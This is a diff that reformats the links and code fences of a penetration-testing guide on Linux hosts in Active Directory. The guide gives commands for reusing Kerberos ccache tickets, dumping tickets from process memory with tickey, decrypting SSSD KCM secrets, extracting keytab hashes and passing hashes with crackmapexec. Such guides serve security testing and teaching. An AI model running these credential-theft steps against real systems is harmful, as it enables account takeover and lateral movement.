@@ -1,6 +1,5 @@
 # Linux Active Directory
 
-
 A linux machine can also be present inside an Active Directory environment.
 
 A linux machine in an AD might be **storing different CCACHE tickets inside files. This tickets can be used and abused as any other kerberos ticket**. In order to read this tickets you will need to be the user owner of the ticket or **root** inside the machine.
@@ -9,7 +8,7 @@ A linux machine in an AD might be **storing different CCACHE tickets inside file
 
 ### AD enumeration from linux
 
-If you have access over an AD in linux (or bash in Windows) you can try [[https://github.com/lefayjey/linWinPwn|https://github.com/lefayjey/linWinPwn]] to enumerate the AD.
+If you have access over an AD in linux (or bash in Windows) you can try [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) to enumerate the AD.
 
 You can also check the following page to learn **other ways to enumerate AD from linux**:
 
@@ -43,10 +42,10 @@ krb5cc_1000
 # Prepare to use it
 export KRB5CCNAME=/tmp/krb5cc_1000
 ```
-```
+
 ### CCACHE ticket reuse from keyring
 
-**Kerberos tickets stored in a process's memory can be extracted**, particularly when the machine's ptrace protection is disabled (`/proc/sys/kernel/yama/ptrace_scope`). A useful tool for this purpose is found at [[https://github.com/TarlogicSecurity/tickey|https://github.com/TarlogicSecurity/tickey]], which facilitates the extraction by injecting into sessions and dumping tickets into `/tmp`.
+**Kerberos tickets stored in a process's memory can be extracted**, particularly when the machine's ptrace protection is disabled (`/proc/sys/kernel/yama/ptrace_scope`). A useful tool for this purpose is found at [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), which facilitates the extraction by injecting into sessions and dumping tickets into `/tmp`.
 
 To configure and use this tool, the steps below are followed:
 
@@ -56,7 +55,7 @@ cd tickey/tickey
 make CONF=Release
 /tmp/tickey -i
 ```
-```
+
 This procedure will attempt to inject into various sessions, indicating success by storing extracted tickets in `/tmp` with a naming convention of `__krb_UID.ccache`.
 
 ### CCACHE ticket reuse from SSSD KCM
@@ -69,7 +68,7 @@ Invoking **`SSSDKCMExtractor`** with the --database and --key parameters will pa
 git clone https://github.com/fireeye/SSSDKCMExtractor
 python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
 ```
-```
+
 The **credential cache Kerberos blob can be converted into a usable Kerberos CCache** file that can be passed to Mimikatz/Rubeus.
 
 ### CCACHE ticket reuse from keytab
@@ -79,7 +78,7 @@ git clone https://github.com/its-a-feature/KeytabParser
 python KeytabParser.py /etc/krb5.keytab
 klist -k /etc/krb5.keytab
 ```
-```
+
 ### Extract accounts from /etc/krb5.keytab
 
 Service account keys, essential for services operating with root privileges, are securely stored in **`/etc/krb5.keytab`** files. These keys, akin to passwords for services, demand strict confidentiality.
@@ -90,31 +89,29 @@ To inspect the keytab file's contents, **`klist`** can be employed. The tool is 
 klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
 # Output includes service principal details and the NT Hash
 ```
-```
+
 For Linux users, **`KeyTabExtract`** offers functionality to extract the RC4 HMAC hash, which can be leveraged for NTLM hash reuse.
 
 ```bash
 python3 keytabextract.py krb5.keytab
 # Expected output varies based on hash availability
 ```
-```
+
 On macOS, **`bifrost`** serves as a tool for keytab file analysis.
 
 ```bash
 ./bifrost -action dump -source keytab -path /path/to/your/file
 ```
-```
+
 Utilizing the extracted account and hash information, connections to servers can be established using tools like **`crackmapexec`**.
 
 ```bash
 crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
 ```
-```
+
 ## References
 
-- [[https://www.tarlogic.com/blog/how-to-attack-kerberos/|https://www.tarlogic.com/blog/how-to-attack-kerberos/]]
-- [[https://github.com/TarlogicSecurity/tickey|https://github.com/TarlogicSecurity/tickey]]
-- [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory|https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory]]
-
-
+- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
+- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)
 
